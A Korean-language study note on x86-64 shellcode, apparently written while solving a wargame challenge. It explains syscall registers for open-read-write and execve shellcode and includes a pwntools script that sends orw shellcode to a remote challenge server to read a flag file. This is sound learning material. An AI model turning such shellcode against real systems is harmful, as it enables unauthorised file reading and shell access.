# 셸코드
- 익스플로잇을 위해 제작된 어셈블리 코드 조각을 일컫음
- rip를 자신이 작성한 셸코드로 옮길 수 있으면 원하는 어셈블리 코드를 실행시킬 수 있음

### orw 셸코드
- ex. "tmp/flag"를 읽는 코드 작성
~~~cpp
char buf[0x30];

int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30); 
write(1, buf, 0x30);
~~~
  - 이를 작성하기 위해 알아야하는 ___syscall ___ 들
![Alt text](/syscall1.png)

- 각 줄들을 어셈블리어로 표현
    - 1. "/tmp/flag"라는 문자열을 메모리에 위치시키기
      - syscall = open, rax = 0x2, const char *filename, int flags, umode_t mode
      - but 스택에는 8바이트 단위로만 값을 push할 수 있음(64비트) 따라서 리틀 엔디안 형태의 /tmp/flag의 리틀 엔디안 코드중 0x67을 우선 푸시하고 0x67616c662f706d742f에서 0x67을 제외한 나머지를 push한다.
      - 그리고 rdi가 이를 가리키도록 rsp를 rdi로 옮긴다
      - O_RDONLY는 0이므로, rsi는 0으로 설정함
      - RDONLY이면 0, WRONLY이면 1, write와 RDWR라면 2이다.
      - ___ rax, rdi, rsi, rdx 인자에 각각 값을 넣어서 syscall을 실행시킴 ___
        - rax : 연산결과 저장, 함수의 반환값 저장, syscall 번호 저장
        - rdi : 첫 번째 인자(argument)를 저장
        - rsi : 두 번째 인자(argument)를 저장
        - rdx : 세 번째 인자(argument)를 저장
      - rax: open(2), read(0), write(1) => 첫 줄에선 open으로 rax에 2로 설정
      - rdi: "/tmp/flag"라는 파일 경로 설정
      - rsi: 읽기전용이므로 0 => open syscall 일때만 생각
      - rdx: 파일 권한 or 추가 옵션
    - 2. read(fd, buf, 0x30) 분석
      - 파일을 읽어오는 시스템 호출
      - rax: raed(0) 0으로 설정
      - rdi 에서는 </u>fd</u>라는 파일 디스크립터를 사용하며 rdi에 저장됨
      - rsi: 메모리 주소 설정, 0x30만큼 읽으므로 rsp-0x30을 대입
      - rdx: 파일로부터 읽어낼 길이, 크기 설정
    - 3. write(1,buf,0x30) 분석
      - rax: wirte(1)이므로 1로 설정
      - rdi: stdout(표준 출력)을 의미하는 1로 설정 (stdin은 0, stderr은 2이다.)
      - rsi: 앞서 read()로 읽어온 데이터를 담고 있음
      - rdx: 데이터 크기

### execve 셸코드
- 임의의 프로그램을 실행하는 코드
- 셸(shell)이란 운영체제에 명령을 내리기 위해 사용되는 사용자 인터페이스
- 커널이란 셸과 대비되며 운영체제의 핵심 기능을 담당함
- 최신 리눅스는 sh, bash를 기본 쉘 프로그램으로 탑재하고 있으며 execve셸코드를 통해 셸을 획득하면 시스템 해킹의 성공으로 여김
- - execve 셸코드는 execve 시스템 콜로만 이루어짐
![Alt text](/syscall2.png)
  - rax : 0x3b => execve 시스템 콜 호출 번호이다
  - rdi : 실행할 프로그램의 경로, 파일 경로 
  - rsi : 프로그램에 전달할 인자 리스트 (NULL 가능)
  - rdx : 환경 변수 리스트(NULL 가능)

### orw 코드 실습(shell_basic)
- execve 시스템 콜은 막혀 orw 사용하며 ___ "/home/shell_basic/flag_name_is_loooooong" ___ 파일을 읽어야 함
- 1. C언어 스켈레톤을 이용하여 푸는 것
- 2. 파이썬 모듈 중 pwntools의 shellcraft를 이용하여 풀기
  - 1번은 아직 C언어에 대한 기초가 없어 2번을 선택함
~~~cpp
from pwn import *

p = remote("접속할 서버 주소소", 포트번호)

# 쉘 코드는 환경에 따라 영향을 받기 때문에, 먼저 아키텍처 정보를 x86-64로 지정해줍니다.
context.arch = "amd64"
# open할 flag 파일 path
path = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(path)	# open("/home/shell_basic/flag_name_is_loooooong")
# open() 함수 결과는 rax 레지스터에 저장된다. → fd = rax
shellcode += shellcraft.read('rax', 'rsp', 0x30)	# read(fd, buf, 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)	# write(stdout, buf, 0x30)
shellcode = asm(shellcode)	# shellcode를 기계어로 변환

payload = shellcode    # payload = shellcode
p.sendlineafter("shellcode: ", payload)    # "shellcode: "가 출력되면 payload + '\n'을 입력
print(p.recv(0x30))    # p가 출력하는 데이터를 0x30 Byte 까지 받아서 출력
~~~
    - shellcraft에서 open, read, write를 모두 지원하여 인자만 잘 써주면 됨
    - shellcraft.open(path)는 open(path,O_RDONLY)를 실행함, 파일 디스크립터(fd)는 rax에 저장됨
    - shellcraft.read('rax','rsp',0x30)에서는 rax에 저장된 파일 디스크립터를 사용하여 파일 내용을 rsp(스택 메모리)에 0x30 바이트만큼 읽음
    - shellcraft.write(1,'rsp',0x30)에서는 표준출력(stdout,1)을 사용하고 rsp에 저장된 데이터를 출력함
    - shellcode = asm(shellcode)는 shellcode로 생성한 어셈블리어를 실행가능한 기계어로 변환함
    - payload = shellcode \n p.sendlineafter("shellcode: ", payload) \n print(p.recv(0x30)) 에서는 "shellcode: " 프롬프트가 나타나면 payload(셸코드)를 전송함
      - 서버가 반환하는 데이터를 0x30바이트만큼 출력함